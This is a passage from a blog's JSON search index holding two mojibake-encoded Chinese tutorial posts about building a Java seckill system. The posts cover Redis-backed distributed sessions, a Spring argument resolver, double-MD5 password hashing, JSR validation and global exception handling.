·è·å–ï¼Œä¸èƒ½é€šè¿‡è¿”å›å€¼è·å–","categories":[],"tags":[{"name":"project","slug":"project","permalink":"https://blog.kayleh.top/tags/project/"}]},{"title":"Javaé«˜æ€§èƒ½é«˜å¹¶å‘ç§’æ€ç³»ç»Ÿ(3)","slug":"Javaé«˜æ€§èƒ½é«˜å¹¶å‘ç§’æ€ç³»ç»Ÿ - å‰¯æœ¬ (2)","date":"2020-11-07T04:12:45.000Z","updated":"2021-04-15T15:25:56.661Z","comments":true,"path":"Javaé«˜æ€§èƒ½é«˜å¹¶å‘ç§’æ€ç³»ç»Ÿ - å‰¯æœ¬ (2)/","link":"","permalink":"https://blog.kayleh.top/Java%E9%AB%98%E6%80%A7%E8%83%BD%E9%AB%98%E5%B9%B6%E5%8F%91%E7%A7%92%E6%9D%80%E7%B3%BB%E7%BB%9F%20-%20%E5%89%AF%E6%9C%AC%20(2)/","excerpt":"","text":"1. å®ç°åˆ†å¸ƒå¼Session1.1 åŸç†å›¾è§£åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° ä½œç”¨ï¼šç”¨Rediså­˜å‚¨Sessionå€¼ï¼Œåœ¨Redisä¸­é€šè¿‡tokenå€¼æ¥è·å–ç”¨æˆ·ä¿¡æ¯ 1.2 æ¯æ¬¡ç™»é™†ï¼Œå°†Sessionçš„è¿‡æœŸæ—¶é—´è¿›è¡Œä¿®æ­£ æ€ä¹ˆè¯´å‘¢ï¼Ÿæˆ‘ä»¬çš„Sessionå€¼å›ºå®šè¿‡æœŸæ—¶é—´ä¸º30minï¼Œè¦åœ¨æ¯æ¬¡ç™»é™†çš„æ—¶å€™ï¼Œä»¥å½“å‰æ—¶é—´ç»§ç»­é¡ºå»¶30åˆ†é’Ÿ æˆ‘ä»¬çš„è§£å†³æ–¹æ³•å°±æ˜¯ï¼Œæ¯æ¬¡ç™»é™†æ—¶ï¼Œé‡æ–°å†æ·»åŠ ä¸€æ¬¡Cookieï¼Œåˆ™èƒ½å¤Ÿå®Œæˆæ—¶é—´å»¶é•¿ ä»¥ä¸‹æ˜¯å°è£…addCookie()çš„æ–¹æ³• private void addCookie(HttpServletResponse response, MiaoShaUser user, String token) { //é¦–æ¬¡ç™»é™†çš„æ—¶å€™ï¼Œéœ€è¦å°†Cookieå­˜å…¥Redis redisService.set(MiaoShaUserKey.getTokenPrefix,token,user); Cookie cookie = new Cookie(COOKIE_NAME_TOKEN, token); cookie.setMaxAge(MiaoShaUserKey.getTokenPrefix.expireSeconds()); //è®¾ç½®ä¸ºæ ¹ç›®å½•ï¼Œåˆ™å¯ä»¥åœ¨æ•´ä¸ªåº”ç”¨èŒƒå›´å†…ä½¿ç”¨cookie cookie.setPath(&quot;/&quot;); response.addCookie(cookie); } 123456789 1.3 Cookieæœ‰ä»€ä¹ˆç”¨ï¼Ÿåœ¨æˆ‘ä»¬è¿™ä¸ªé¡¹ç›®ä¸­ï¼ŒCookieä¸­å­˜å‚¨çš„æ˜¯tokenå€¼ã€‚è€Œè¿™ä¸ªtokenå€¼æ˜¯å’Œç”¨æˆ·ä¿¡æ¯æ˜¯ä¸€ä¸€ç»‘å®šçš„ï¼Œå°†ä¼šå­˜å‚¨åœ¨Redisä¸­ã€‚æˆ‘ä»¬ä»Cookieä¸­è·å–åˆ°tokenï¼Œä»è€Œå°±å¯ä»¥è·å–åˆ°ç”¨æˆ·ï¼Œä¸‹é¢ç®€åŒ–ä»£ç çš„è¿‡ç¨‹ï¼Œä¾¿æ˜¯å¯¹è¿™ä¸€è¿‡ç¨‹çš„æ¼”ç¤ºã€‚ 1.4 åˆ†å¸ƒå¼Sessionçš„ç†è§£æœåŠ¡å™¨ä¸­çš„åŸç”Ÿsessionæ˜¯æ— æ³•æ»¡è¶³éœ€æ±‚çš„ï¼Œå› ä¸ºç”¨æˆ·çš„è¯·æ±‚æœ‰å¯èƒ½éšæœºè½å…¥åˆ°ä¸åŒçš„æœåŠ¡å™¨ä¸­ï¼Œè¿™æ ·çš„ç»“æœå°†ä¼šå¯¼è‡´ç”¨æˆ·çš„sessionä¸¢å¤±ï¼Œä¼ ç»Ÿåšæ³•ä¸­æœ‰è§£å†³æ–¹æ¡ˆï¼Œæ˜¯è¿›è¡ŒsessionåŒæ­¥ï¼Œå°†ä¸€ä¸ªæœåŠ¡å™¨ä¸Šçš„sessionè¿›è¡ŒåŒæ­¥åˆ°å¦ä¸€ä¸ªæœåŠ¡å™¨ä¸Šï¼Œåœ¨ä¸€ä¸ªé›†ç¾¤ä¸­æ— è®ºä½ è®¿é—®å“ªä¸ªæœåŠ¡å™¨éƒ½å¯ä»¥å…±äº«ï¼Œä½†æ˜¯è¿™ç§æ–¹æ³•æœ‰ä¸ªæ˜æ˜¾ç¼ºé™·ï¼Œå°±æ˜¯æ€§èƒ½é—®é¢˜ï¼Œä¼ è¾“æœ‰æ—¶å»¶é—®é¢˜ï¼Œå…¶æ¬¡è¿™æ ·æ¯å°æœåŠ¡å™¨çš„sessioné‡å¤æ‹¥æœ‰ï¼Œè¿™æ ·å…¶å†…å­˜å¿…ç„¶å—åˆ°å½±å“ï¼Œå¦‚æœåªæœ‰å‡ å°æœåŠ¡å™¨è¿˜å¥½ï¼Œå¦‚æœæ˜¯åå°ï¼ŒäºŒåå°æœåŠ¡å™¨å‘¢ï¼Ÿè¿™ç§ææ€–çš„åœºæ™¯ä¼šæ˜¯ä»€ä¹ˆæ ·çš„ä½“éªŒå‘¢ï¼Œæˆ‘å°±æ— æ³•å¾—çŸ¥äº†ã€‚ é‚£ä¹ˆæˆ‘ä»¬åº”è¯¥å¦‚ä½•æœ‰æ•ˆçš„è§£å†³è¿™æ ·çš„é—®é¢˜å‘¢ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¼ è¯´ä¸­çš„tokenæ¥è§£å†³ï¼Œç®€å•æ˜äº†çš„è¯´å°±æ˜¯ç”¨æˆ·æ¯æ¬¡ç™»é™†çš„æ—¶å€™ç”Ÿæˆä¸€ä¸ªç±»ä¼¼sessionIdçš„ä¸œè¥¿ï¼ˆä¹Ÿå°±æ˜¯æ‰€è°“çš„tokenï¼Œè¿™å°†æ˜¯å…¨å±€çš„å”¯ä¸€æ ‡è¯†ï¼Œå¦‚UUIDï¼Œä½œç”¨ç±»ä¼¼äºï¼ˆsessionIdï¼‰ï¼‰ï¼Œå°†å…¶å†™åˆ°cookieå½“ä¸­ä¼ é€ç»™å®¢æˆ·ç«¯ï¼Œå®¢æˆ·ç«¯å¯¹æ•°æ®åº“è®¿é—®è¿‡ç¨‹ä¸­ä¸æ–­ä¸Šä¼ è¿™ä¸ªtokenï¼Œè€Œæˆ‘ä»¬æœåŠ¡ç«¯æ‹¿åˆ°è¿™ä¸ªtokenå°±å¯ä»¥è·å–ç”¨æˆ·çš„ä¿¡æ¯ï¼Œè¿™ä¸ªé“ç†å…¶å®åœ¨å¾ˆå¤šåœ°æ–¹æ˜¯ç›¸é€šçš„ï¼Œæ¯”å¦‚æˆ‘ä»¬å®¹å™¨ä¸­å®ç°åŸç”Ÿsessionï¼Œä¹Ÿæ˜¯å°†ç”Ÿæˆçš„idå†™å…¥cookieå½“ä¸­ã€‚ 2. è§£å†³æ³¨è§£è·å–å‚æ•°é€ æˆçš„ä»£ç å†—ä½™æˆ‘ä»¬çœ‹ä¸€ä¸‹ï¼Œå¦‚ä¸‹ä»£ç  @RequestMapping(&quot;/to_list&quot;) public String toList(Model model, @CookieValue(value = MiaoShaUserService.COOKIE_NAME_TOKEN,required = false) String cookieToken, @RequestParam(value = MiaoShaUserService.COOKIE_NAME_TOKEN,required = false) String paramToken, ){ if(StringUtils.isEmpty(cookieToken) &amp;&amp; StringUtils.isEmpty(paramToken)){ return &quot;login&quot;; } String token = StringUtils.isEmpty(paramToken) ? cookieToken : paramToken; MiaoShaUser user = miaoShaUserService.getByToken(response,token); model.addAttribute(&quot;user&quot;,user); return &quot;goods_list&quot;; } 123456789101112131415 @CookieValueï¼šè¿™ä¸ªæ³¨è§£èƒ½å¤Ÿæ ¹æ®å‚æ•°valueåœ¨Cookieä¸­è·å–å€¼ @RequestParamï¼šè¯¥æ³¨è§£è®©æˆ‘ä»¬åœ¨Requestä¸­èƒ½è·å–å‚æ•°ï¼Œè§£å†³çš„ä¸»è¦æ˜¯ï¼Œç§»åŠ¨æ‰‹æœºç«¯ä¸ä½¿ç”¨Cookieå­˜å€¼çš„é—®é¢˜ æˆ‘ä»¬åœ¨å¦‚ä¸Šä»£ç ä¸­ï¼Œå¯ä»¥å‘ç°ï¼Œæ³¨è§£æ ‡è®°è·å–å‚æ•°ï¼Œä½¿å¾—ä»£ç å¾ˆåšé‡ï¼Œè‹¥æˆ‘ä»¬æ¯æ¬¡æƒ³ä»Cookieä¸­è·å–tokenå€¼æ—¶ï¼Œéƒ½éœ€è¦å¤ç°å¦‚ä¸Šä»£ç ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æŠŠå®ƒå‰–ç¦»å‡ºæ¥ 2.1 WebMvcConfigurerAdapteråœ¨è¿™ä¸ªé¡¹ç›®ä¸­ï¼Œæˆ‘ä»¬é‡‡ç”¨çš„æ˜¯ç»§æ‰¿WebMvcConfigurerAdapterï¼Œé‡å†™å…¶ä¸­addArgumentResolvers()æ–¹æ³•ï¼Œè¯¥æ–¹æ³•å®ç°çš„æ˜¯å‚æ•°è§£æçš„åŠŸèƒ½ @Configuration public class WebConfig extends WebMvcConfigurerAdapter{ @Autowired UserArgumentResolver userArgumentResolver; @Override public void addArgumentResolvers(List&lt;HandlerMethodArgumentResolver&gt; argumentResolvers) { super.addArgumentResolvers(argumentResolvers); argumentResolvers.add(userArgumentResolver); } } 123456789101112 2.1.1 è¯¥æ–¹æ³•åœ¨Spring5.0ä¹‹åå°±è¿‡æ—¶äº† ç°ç”¨æ–¹å¼ å®ç°WebMvcConfigurer @Configuration public class WebMvcConfg implements WebMvcConfigurer { //TODO } 1234 ç»§æ‰¿WebMVCConfigurationSupport @Configuration public class WebMvcConfg extends WebMvcConfigurationSupport { //TODO } 1234 2.2 åœ¨argumentResolversä¸­æ·»åŠ æˆ‘ä»¬çš„å‚æ•°è§£æé€»è¾‘ é¦–å…ˆï¼Œæˆ‘ä»¬åº”è¯¥ææ¸…æ¥šï¼Œæˆ‘ä»¬æƒ³è¦çš„å‚æ•°æ˜¯ä»€ä¹ˆï¼Ÿå›çœ‹ä»£ç å†—ä½™çš„é—®é¢˜ï¼Œæœ€ç»ˆæˆ‘ä»¬æƒ³è·å–çš„æ˜¯MiaoShaUserï¼Œè¿™ä¸‹æˆ‘ä»¬è¿›è¡Œä»£ç çš„ç¼–å†™ @Service public class UserArgumentResolver implements HandlerMethodArgumentResolver { @Autowired MiaoShaUserService miaoShaUserService; @Override public boolean supportsParameter(MethodParameter methodParameter) { //è¿™ä¸ªæ–¹æ³•åˆ¤æ–­å‚æ•°ç±»å‹æ˜¯å¦æ”¯æŒ Class&lt;?&gt; clazz = methodParameter.getParameterType(); return clazz == MiaoShaUser.class; } @Override public Object resolveArgument(MethodParameter methodParameter, ModelAndViewContainer modelAndViewContainer, NativeWebRequest nativeWebRequest, WebDataBinderFactory webDataBinderFactory) throws Exception { //è¿™ä¸ªæ–¹æ³•å®ç°å¯¹å‚æ•°çš„å¤„ç† HttpServletRequest request = nativeWebRequest.getNativeRequest(HttpServletRequest.class); HttpServletResponse response = nativeWebRequest.getNativeResponse(HttpServletResponse.class); String paramToken = request.getParameter(miaoShaUserService.COOKIE_NAME_TOKEN); String cookieToken = getCookieValue(request, miaoShaUserService.COOKIE_NAME_TOKEN); if(StringUtils.isEmpty(paramToken) &amp;&amp; StringUtils.isEmpty(cookieToken)){ return null; } String token = StringUtils.isEmpty(paramToken) ? cookieToken : paramToken; return miaoShaUserService.getByToken(response,token); } private String getCookieValue(HttpServletRequest request,String cookieName){ Cookie[] cookies = request.getCookies(); for(Cookie cookie : cookies){ if(cookie.getName().equals(cookieName)){ return cookie.getValue(); } } return null; } } å®ç°HandlerMethodArgumentResolveræ¥å£ï¼Œå¿…é¡»é‡å†™å…¶ä¸­çš„ä¸¤ä¸ªæ–¹æ³•ï¼ŒsupportsParameter()å’ŒresolveArgument() å‰è€…æ˜¯å¯¹æˆ‘ä»¬è¦è¿›è¡Œè§£æçš„å‚æ•°ç±»å‹è¿›è¡Œåˆ¤æ–­ï¼Œç¬¦åˆæ‰æ‰§è¡Œåè€… åè€…æ˜¯æˆ‘ä»¬å¯¹å‚æ•°çš„å¤„ç†é€»è¾‘ï¼Œä¸¤ç§æƒ…å†µï¼Œä¸€æ˜¯ä»requestä¸­è·å–tokenå€¼ï¼ŒäºŒæ˜¯ä»cookieä¸­æ‹¿å–tokenå€¼ï¼Œæ ¹æ®tokenå€¼æ¥è·å–åˆ°å¯¹åº”çš„user ä»¥ä¸Šå°±å°†æˆ‘ä»¬éœ€è¦çš„å‚æ•°çš„å¤„ç†é€»è¾‘å®ç°äº†ï¼Œåœ¨Mvcé…ç½®ä¸­ï¼Œç”¨argumentResolvers.add(userArgumentResolver)æ–¹æ³•è¿›è¡Œæ·»åŠ å³å¯ï¼Œè¿™æ ·æˆ‘ä»¬å†æƒ³è·å–userçš„æ—¶å€™å°±ç®€å•å¤šäº†ï¼Œå¦‚ä¸‹ 2.3 å¦‚æ­¤æ¸…çˆ½çš„ä»£ç  @RequestMapping(&quot;/to_list&quot;) public String toList(Model model,MiaoShaUser user){ model.addAttribute(&quot;user&quot;,user); return &quot;goods_list&quot;; } 12345 çœå»äº†@CookieValueå’Œ@RequestParamæ³¨è§£çš„å†—ä½™ï¼Œè€Œä¸”æˆ‘ä»¬å¯¹userçš„è·å–ä¹Ÿæ–¹ä¾¿å¤šäº†","categories":[],"tags":[{"name":"project","slug":"project","permalink":"https://blog.kayleh.top/tags/project/"}]},{"title":"Javaé«˜æ€§èƒ½é«˜å¹¶å‘ç§’æ€ç³»ç»Ÿ(2)","slug":"Javaé«˜æ€§èƒ½é«˜å¹¶å‘ç§’æ€ç³»ç»Ÿ - å‰¯æœ¬","date":"2020-11-06T04:13:45.000Z","updated":"2021-04-15T15:25:31.860Z","comments":true,"path":"Javaé«˜æ€§èƒ½é«˜å¹¶å‘ç§’æ€ç³»ç»Ÿ - å‰¯æœ¬/","link":"","permalink":"https://blog.kayleh.top/Java%E9%AB%98%E6%80%A7%E8%83%BD%E9%AB%98%E5%B9%B6%E5%8F%91%E7%A7%92%E6%9D%80%E7%B3%BB%E7%BB%9F%20-%20%E5%89%AF%E6%9C%AC/","excerpt":"","text":"1. ç™»å½•è¿‡ç¨‹ä¸­ï¼Œå¯†ç ä¸¤æ¬¡MD5åŠ å¯†1.1 ä¸ºå•¥ç”¨ä¸¤æ¬¡MD5å“‡ï¼Ÿ ç¬¬ä¸€æ¬¡MD5ï¼Œæ˜¯é’ˆå¯¹ä¼ è¾“å®‰å…¨åšçš„MD5åŠ å¯†ï¼Œå› ä¸ºhttpæ˜¯æ˜æ–‡ä¼ é€’ï¼Œå¦‚æœä¸è¿›è¡ŒåŠ å¯†çš„è¯ï¼Œå¯†ç å°±ç›´æ¥è¢«åŠ«æŒäº†ã€‚(Password1 = MD5(inputPassword,å›ºå®šçš„saltå€¼)ï¼Œsaltä¸ºå­—ç¬¦ä¸²) ç¬¬äºŒæ¬¡MD5ï¼Œæ˜¯é’ˆå¯¹æ•°æ®åº“å®‰å…¨åšçš„MD5åŠ å¯†ï¼Œä¿è¯æ•°æ®åº“çš„é˜²ç›—å®‰å…¨ã€‚è‹¥ä¸è¿›è¡ŒäºŒæ¬¡åŠ å¯†ï¼ŒMD5å€¼ç»æ•°æ®åº“è·å–ï¼Œå¯ç›´æ¥è¢«MD5è½¬æ¢å™¨ç›´æ¥è½¬æ¢ä¸ºç”¨æˆ·å¯†ç ï¼Œä¸å®‰å…¨ã€‚(Password2 = MD5(Password1,éšæœºçš„saltå€¼)) 2. æ„å»ºæ•°æ®åº“è¡¨åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° 2.1 å‡ ä¸ªéœ€è¦æ³¨æ„çš„ç‚¹ å­—ç¬¦é›†é‡‡ç”¨çš„æ˜¯utf8mb4(most bytes 4)ã€‚ç®€å•æ¥è¯´ï¼Œutf8mb4æ˜¯utf8çš„è¶…é›†ï¼Œèƒ½å¤Ÿç”¨4ä¸ªå­—èŠ‚å­˜å‚¨æ›´å¤šçš„å­—ç¬¦ã€‚æ ‡å‡†UTF-8å­—ç¬¦é›†ç¼–ç å¯ä»¥ç”¨1~4ä¸ªå­—èŠ‚å–ç¼–ç 21ä½å­—ç¬¦ï¼Œä½†æ˜¯åœ¨MySQLä¸­ï¼Œutf8æœ€å¤šä½¿ç”¨3ä¸ªå­—èŠ‚ï¼Œåƒä¸€äº›è¡¨æƒ…emojiå’Œä¸å¸¸ç”¨çš„å­—ç¬¦å¦‚â€œå¢…â€éœ€è¦ç”¨4ä¸ªå­—èŠ‚æ‰èƒ½è¡¨ç¤ºå‡ºæ¥ã€‚ç”¨utf8mb4èƒ½è§£å†³ä»¥ä¸Šé—®é¢˜ã€‚ æ•°æ®åº“ä¸­å­˜å‚¨äº†&quot;åŠ¨æ€&quot;saltå€¼ 3. é’ˆå¯¹MD5åŠ å¯†åŠŸèƒ½ï¼Œå°è£…äº†ä¸“ç”¨å·¥å…·ç±»ä»¥ä¸‹MD5åŒ…çš„Mavenä¾èµ–äº†è§£ä»¥ä¸‹ &lt;dependency&gt; &lt;groupId&gt;commons-codec&lt;/groupId&gt; &lt;artifactId&gt;commons-codec&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.commons&lt;/groupId&gt; &lt;artifactId&gt;commons-lang3&lt;/artifactId&gt; &lt;version&gt;3.6&lt;/version&gt; &lt;/dependency&gt; 123456789 3.1 å·¥å…·ç±»ä»£ç public class MD5Util { //é™æ€çš„saltï¼Œç”¨äºç¬¬ä¸€æ¬¡MD5 private static final String salt = &quot;1a2b3c4d&quot;; private static String md5(String src){ //è°ƒç”¨DigestUtilsï¼Œå®ç°md5å¤„ç† return DigestUtils.md5Hex(src); } /** * ç¬¬ä¸€æ¬¡MD5å¤„ç† * @param inputPass * @return */ public static String inputPassToFormPass(String inputPass){ //è¿™é‡Œæ²¡åŠ â€œâ€å‡ºç°äº†é—®é¢˜ï¼Ÿï¼Ÿï¼Ÿ String pass =&quot;&quot; + salt.charAt(1) + salt.charAt(7) + inputPass + salt.charAt(3) + salt.charAt(5); //System.out.println(pass); return md5(pass); } ... } 123456789101112131415161718192021222324 æˆ‘åœ¨ç¬¬ä¸€æ¬¡å¤„ç†åŠ å¯†æ—¶ï¼Œæ‹¼æ¥å­—ç¬¦æ—¶æ²¡æœ‰æ·»åŠ &quot;&quot;ï¼Œå‡ºç°äº†ç™»å½•éªŒè¯å¤±è´¥çš„é—®é¢˜ 4. åŠ å…¥JSRå‚æ•°æ ¡éªŒ4.1 JSRå‚æ•°æ ¡éªŒ æˆ‘ä»¬çœ‹å¦‚ä¸‹ï¼Œä»£ç ï¼Œåœ¨ç™»å½•å¤„ç†è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬è¦ç”¨ä»£ç å®ç°å¯¹å‰ç«¯ä¼ è¿‡æ¥çš„idå’Œpasswordè¿›è¡Œæ ¡éªŒï¼ˆæˆ‘ä»¬è¿™é‡Œæ˜¯éªŒè¯éç©ºï¼‰ï¼Œå¼•å…¥JSRå‚æ•°æ ¡éªŒä¹‹åï¼Œèƒ½å¤Ÿå°†è¿™äº›ä»£ç çœå» @PostMapping(&quot;/do_login&quot;) @ResponseBody public Result&lt;Boolean&gt; doLogin(LoginVo loginVo){ log.info(loginVo.toString()); //å‚æ•°æ ¡éªŒ String mobile = loginVo.getMobile(); String password = loginVo.getPassword(); if(StringUtils.isEmpty(password)){ return Result.error(CodeMsg.PASSWORD_EMPTY); } if(! ValidatorUtil.isMobile(mobile)){ return Result.error(CodeMsg.MOBILE_ERROR); } CodeMsg msg = miaoShaUserService.login(loginVo); if(msg.getCode() == 0){ return Result.success(true); }else { return Result.error(msg); } } 12345678910111213141516171819202122 è¿›è¡ŒJSRå‚æ•°æ ¡éªŒå‡çº§ æˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹å¯¼å…¥çš„åŒ… &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-validation&lt;/artifactId&gt; &lt;/dependency&gt; 1234 æˆ‘ä»¬åœ¨doLogin()æ–¹æ³•ä¸Šï¼ŒåŠ ä¸ŠJSRéªŒè¯ï¼Œ@Validæ³¨è§£ public Result&lt;CodeMsg&gt; doLogin(@Valid LoginVo loginVo) 1 è¢«æ ‡æ³¨çš„å‚æ•°ï¼Œæˆ‘ä»¬è¿›å…¥å®ƒçš„å®ç°ç±»ä¸­ï¼Œå¯¹å…¶ä¸­çš„å­—æ®µè¿›è¡Œçº¦æŸï¼Œå¦‚ä¸‹ï¼ˆ@NotNullï¼Œ@Lengthï¼Œ@IsMobileï¼Œå…¶ä¸­@IsMobileæ˜¯æˆ‘ä»¬è‡ªå®šä¹‰çš„æ³¨è§£ï¼‰ @Data public class LoginVo { @IsMobile @NotNull private String mobile; @NotNull @Length(min = 32) private String password; } 1234567891011 4.2 @IsMobileè‡ªå®šä¹‰æ³¨è§£æˆ‘ä»¬çœ‹ä¸€ä¸‹å®ƒçš„ä»£ç ï¼ˆè¿™ä¸ªæ³¨è§£çš„å†™æ³•ï¼Œæ ¹æ®å·²æœ‰æ³¨è§£@NotNullï¼Œä»¿å†™è€Œæ¥ï¼‰ï¼Œå®ƒå®ç°çš„æ˜¯å¯¹æ‰‹æœºå·ç çš„éªŒè¯ @Target({ElementType.FIELD, ElementType.ANNOTATION_TYPE, ElementType.CONSTRUCTOR, ElementType.PARAMETER}) @Retention(RetentionPolicy.RUNTIME) @Documented @Constraint( validatedBy = {IsMobileValidator.class} ) public @interface IsMobile { boolean required() default true; //ä»¥ä¸‹ä¸‰æ¡è¯­å¥ï¼Œè¶³çŸ£ //æˆ‘ä»¬åœ¨å…¶ä¸­æ·»åŠ é”™è¯¯ä¿¡æ¯ String message() default &quot;æ‰‹æœºå·ç æ ¼å¼é”™è¯¯&quot;; Class&lt;?&gt;[] groups() default {}; Class&lt;? extends Payload&gt;[] payload() default {}; } 123456789101112131415161718 @Targetï¼šè¡¨ç¤ºçš„æ˜¯èƒ½å¤Ÿæ ‡æ³¨çš„èŒƒå›´ @Constraintï¼šè¿™ä¸ªæ³¨è§£å¸®åŠ©æˆ‘ä»¬å¤„ç†é€»è¾‘ï¼Œå…¶ä¸­æœ‰IsMobileValidator.classæ˜¯çœŸæ­£å¤„ç†é€»è¾‘çš„ç±»ï¼Œæˆ‘ä»¬çœ‹çœ‹å®ƒçš„ä»£ç  public class IsMobileValidator implements ConstraintValidator&lt;IsMobile, String&gt; { private boolean required = false; @Override public boolean isValid(String s, ConstraintValidatorContext constraintValidatorContext) { if(required){ //åœ¨å¿…é¡»æœ‰å€¼çš„æƒ…å†µä¸‹ return ValidatorUtil.isMobile(s); }else { //åœ¨ä¸è¦æ±‚æœ‰å€¼çš„æƒ…å†µä¸‹ if(StringUtils.isEmpty(s)){ //ç©ºå€¼æ˜¯å…è®¸çš„ return true; }else { //æœ‰å€¼å°±ç»™å®ƒåˆ¤æ–­åˆ¤æ–­ return ValidatorUtil.isMobile(s); } } } @Override public void initialize(IsMobile constraintAnnotation) { required = constraintAnnotation.required(); } } 1234567891011121314151617181920212223242526 å…ˆçœ‹ç±»çš„å£°æ˜éƒ¨åˆ†ï¼Œpublic class IsMobileValidator implements ConstraintValidatorï¼Œå®ƒæœ‰ä¸¤ä¸ªæ³›å‹ï¼Œç¬¬ä¸€ä¸ªæ˜¯è‡ªå®šä¹‰çš„æ³¨è§£ç±»ï¼Œç¬¬äºŒä¸ªæ˜¯è¦éªŒè¯çš„å‚æ•°ç±»å‹ï¼Œå¦å¤–å®ç°è¯¥æ¥å£çš„é€»è¾‘ç±»ï¼Œè¢«springç®¡ç†æˆbeanï¼Œå¯ä»¥åœ¨éœ€è¦çš„åœ°æ–¹è¿›è¡Œè£…é… å…¶ä¸­æœ‰ä¸€ä¸ªinitializeï¼Œåˆå§‹åŒ–æ–¹æ³•ï¼Œå®ƒè°ƒç”¨çš„æ˜¯æˆ‘ä»¬è‡ªå®šä¹‰æ³¨è§£ä¸­å†™çš„required()æ–¹æ³•ï¼Œé»˜è®¤éœ€è¦æœ‰å€¼ å¦ä¸€ä¸ªæ–¹æ³•isValidï¼Œåˆ™å¯¹é€»è¾‘è¿›è¡ŒéªŒè¯ï¼ŒtrueéªŒè¯é€šè¿‡ï¼ŒfalseéªŒè¯å¤±è´¥ 5. å…¨å±€å¼‚å¸¸å¤„ç†å™¨5.1 æˆ‘ä»¬ä¸ºä»€ä¹ˆè¦å¼•å…¥å…¨å±€å¼‚å¸¸å¤„ç†å™¨ï¼Ÿ ä¸€è¾¹æƒ³ï¼Œä¸€è¾¹çœ‹ä¸€ä¸‹ä¸‹é¢è¿™ä¸ªæ–¹æ³• public CodeMsg login(LoginVo loginVo){ if(loginVo == null){ return CodeMsg.SERVER_ERROR; } String mobile = loginVo.getMobile(); String password = loginVo.getPassword(); //åˆ¤æ–­æ‰‹æœºå·æ˜¯å¦å­˜åœ¨ MiaoShaUser user = getById(Long.parseLong(mobile)); if(user == null){ return CodeMsg.MOBILE_NOT_EXIST; } //éªŒè¯å¯†ç  String DBPass = user.getPassword(); //è¿™é‡Œå¯¹å‰ç«¯æ¥çš„å¯†ç ç¬¬äºŒæ¬¡MD5å¤„ç† String formPassToDBPass = MD5Util.formPassToDBPass(password, user.getSalt()); if(!formPassToDBPass.equals(DBPass)){ return CodeMsg.PASSWORD_ERROR; } return CodeMsg.SUCCESS; } 1234567891011121314151617181920212223 å®ƒçš„è¿”å›å€¼æ˜¯CodeMsgï¼Œè€Œåœ¨ä¸šåŠ¡ä¸­ï¼Œæ–¹æ³•å¯¹åº”çš„è¿”å›å€¼åº”è¯¥æ˜¯ç¡®åˆ‡çš„ï¼Œæˆ‘ä»¬ç™»é™†ï¼Œè¿”å›åº”è¯¥ä¸º true æˆ– falseï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬è¦å¯¹è¿™é‡Œè¿›è¡Œä¼˜åŒ– 5.2 ä¼˜åŒ–ä»£ç å¦‚ä¸‹ public boolean login(LoginVo loginVo){ if(loginVo == null){ throw new GlobalException(CodeMsg.SERVER_ERROR); } String mobile = loginVo.getMobile(); String password = loginVo.getPassword(); //åˆ¤æ–­æ‰‹æœºå·æ˜¯å¦å­˜åœ¨ MiaoShaUser user = getById(Long.parseLong(mobile)); if(user == null){ throw new GlobalException(CodeMsg.MOBILE_NOT_EXIST); } //éªŒè¯å¯†ç  String DBPass = user.getPassword(); //è¿™é‡Œå¯¹å‰ç«¯æ¥çš„å¯†ç ç¬¬äºŒæ¬¡MD5å¤„ç† String formPassToDBPass = MD5Util.formPassToDBPass(password, user.getSalt()); if(!formPassToDBPass.equals(DBPass)){ throw new GlobalException(CodeMsg.PASSWORD_ERROR); } return true; } 1234567891011121314151617181920212223 æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œå¯¹åº”çš„å‚æ•°éªŒè¯ï¼Œå¹¶æ²¡æœ‰è¿”å›å€¼ï¼Œè€Œæ˜¯ç›´æ¥æŠ›å‡ºå¼‚å¸¸ï¼Œè€Œä¸”æˆ‘ä»¬ä¹Ÿå°†è¿”å›å€¼è¿›è¡Œäº†ä¿®æ”¹ï¼Œæ‰§è¡Œåˆ°æ–¹æ³•çš„æœ€åï¼Œèƒ½å¤Ÿè¿”å›ture 5.3 å…¨å±€å¼‚å¸¸public class GlobalException extends RuntimeException { private CodeMsg codeMsg; public GlobalException(CodeMsg codeMsg){ this.codeMsg = codeMsg; } public CodeMsg getCodeMsg() { return codeMsg; } } 1234567891011 å…¨å±€å¼‚å¸¸å°±æ¯”è¾ƒç®€å•äº†ï¼Œå®ƒç»§æ‰¿äº†RuntimeExceptionç±»ï¼Œå…¶ä¸­åŒ…å«æˆ‘ä»¬éœ€è¦è¿”å›çš„ä¿¡æ¯CodeMsgçš„å­—æ®µ 5.4 å…¨å±€å¼‚å¸¸å¤„ç†å™¨è¿™ä¸ªå¤„ç†å™¨å¯å°±å€¼å¾—è¯´ä¸€è¯´äº†ï¼ @ControllerAdvice @ResponseBody public class GlobalExceptionHandler { @ExceptionHandler(value = Exception.class) public Result&lt;String&gt; exceptionHandler(HttpServletRequest request,Exception e){ if(e instanceof GlobalException){ GlobalException ge = (GlobalException) e; CodeMsg codeMsg = ge.getCodeMsg(); return Result.error(codeMsg); } else if(e instanceof BindException){ //è·å–é”™è¯¯åˆ—è¡¨ï¼Œæ‹¿å–å…¶ä¸­çš„ç¬¬ä¸€ä¸ª BindException be = (BindException) e; List&lt;ObjectError&gt; allErrors = be.getAllErrors(); ObjectError error = allErrors.get(0); String message = error.getDefaultMessage(); return Result.error(CodeMsg.BIND_ERROR.fillArgs(message)); }else { return Result.error(CodeMsg.SERVER_ERROR); } } } 12345678910111213141516171819202122232425 @ControllerAdviceï¼šå®ƒæ˜¯å¢å¼ºçš„Controllerï¼Œèƒ½å¤Ÿå®ç°å…¨å±€å¼‚å¸¸å¤„ç†å’Œå…¨å±€æ•°æ®ç»‘å®š é…åˆ@ExceptionHandler(value = 